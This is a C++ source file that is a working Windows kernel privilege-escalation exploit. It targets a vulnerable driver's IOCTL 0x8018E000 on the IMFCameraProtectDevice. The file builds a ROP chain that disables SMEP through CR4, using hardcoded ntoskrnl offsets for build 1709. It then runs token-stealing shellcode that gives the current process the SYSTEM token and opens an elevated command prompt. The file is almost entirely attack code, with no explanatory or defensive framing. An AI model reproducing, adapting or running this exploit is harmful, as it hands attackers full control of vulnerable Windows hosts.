#include <iostream>
#include <Windows.h>
#include <winioctl.h>
#include <Psapi.h>
#include <string>

#define SymLinkName L"\\\\.\\IMFCameraProtectDevice"

HANDLE hDevice;

VOID EOP_8018E000(INT64 kernel_base, DWORD pid)
{
    // SHELLCODE FOR 1709
    BYTE token_steal[] =
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"    // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
        "\x4C\x8B\x82\xB8\x00\x00\x00"            // mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
        "\x4D\x8B\x88\xe8\x02\x00\x00"            // mov r9, [r8 + 2e8h]      ; ActiveProcessLinks list head
        "\x49\x8B\x09"                            // mov rcx, [r9]            ; Follow link to first process in list
        // find_system_proc:
        "\x48\x8B\x51\xF8"    // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
        "\x48\x83\xFA\x04"    // cmp rdx, 4               ; Process with ID 4 is System process
        "\x74\x05"            // jz found_system          ; Found SYSTEM token
        "\x48\x8B\x09"        // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
        "\xEB\xF1"            // jmp find_system_proc     ; Loop
        // found_system:
        "\x48\x8B\x41\x70"    // mov rax, [rcx + 70h]     ; Offset from ActiveProcessLinks to Token
        "\x24\xF0"            // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
        // find cmd
        "\x48\x8B\x51\xF8"                // mov rdx, [rcx-8]         ;ActiveProcessLinks - 8 = UniqueProcessId
        "\x48\x81\xFA\x99\x99\x00\x00"    // cmp rdx, 0d54h           ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
        "\x74\x05"                        // jz found_cmd             ;YES - move on
        "\x48\x8B\x09"                    // mov rcx, [rcx]           ;NO - next entry in list
        "\xEB\xEE"                        // jmp find_cmd             ;loop
        // found cmd
        "\x48\x89\x41\x70"    // mov [rcx+70h], rax       ;copy SYSTEM token over top of this process's token
        
        "\x48\xc7\xc1\xf8\x06\x15\x00"    // mov rcx, 0x1506f8        ; move original cr4 value into rcx
        "\xc3";                           // ret                      ; RET

    token_steal[54] = pid;
    token_steal[55] = pid >> 8;

    LPVOID allocated_shellcode = VirtualAlloc(NULL, sizeof(token_steal), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(allocated_shellcode, token_steal, sizeof(token_steal));

    INT64 pop_rcx_offset = kernel_base + 0x15fc70;    // gadget 1 1709 - pop rcx ; ret
    INT64 mov_cr4_offset = kernel_base + 0x76a02;     // gadget 2 1709 - mov cr4, ecx ; ret
    INT64 wbindv_offset = kernel_base + 0x1175c0;     // gadget 3 1709 - wbinvd; ret
    INT64 rcx_value = 0x506f8;                        // value we want placed in cr4 in order to disable SMEP
    INT64 rcx_old_value = 0x1506f8;                   // original cr4 value
    INT64 ret = pop_rcx_offset + 1;                   // RET NOP

    BYTE input_buff[136] = {0};
    memset(input_buff, '\x41', 0x20);
    memcpy(input_buff + 0x20, (PINT64)&pop_rcx_offset, 8);    // pop rcx
    memcpy(input_buff + 0x28, (PINT64)&rcx_value, 8);         // disable SMEP value
    memcpy(input_buff + 0x30, (PINT64)&mov_cr4_offset, 8);    // mov cr4, rcx
    memcpy(input_buff + 0x38, (PINT64)&wbindv_offset, 8);
    memcpy(input_buff + 0x40, (PINT64)&allocated_shellcode, 8);    // shellcode
    memcpy(input_buff + 0x48, (PINT64)&mov_cr4_offset, 8);    // mov cr4, rcx
    memcpy(input_buff + 0x50, (PINT64)&ret, 8);               // RETNOP to restore the stack
    memcpy(input_buff + 0x58, (PINT64)&ret, 8);               // RETNOP to restore the stack

    DWORD dwWrite = 0x0;
    LPVOID data = VirtualAlloc(NULL, 0x30, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memset(data, 'b', 0x8);
    DeviceIoControl(hDevice, 0x8018E000, input_buff, 0x60, NULL, 0, &dwWrite, NULL);
    system("start cmd.exe");
}

LPVOID GetBaseAddr(const char* drvname)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        char szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++)
        {
            if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
            {
                if (strcmp(szDrivers, drvname) == 0)
                {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    INT64 nt = (INT64)GetBaseAddr("ntoskrnl.exe");
    EOP_8018E000(nt, GetCurrentProcessId());

    system("pause");
    return 0;
}
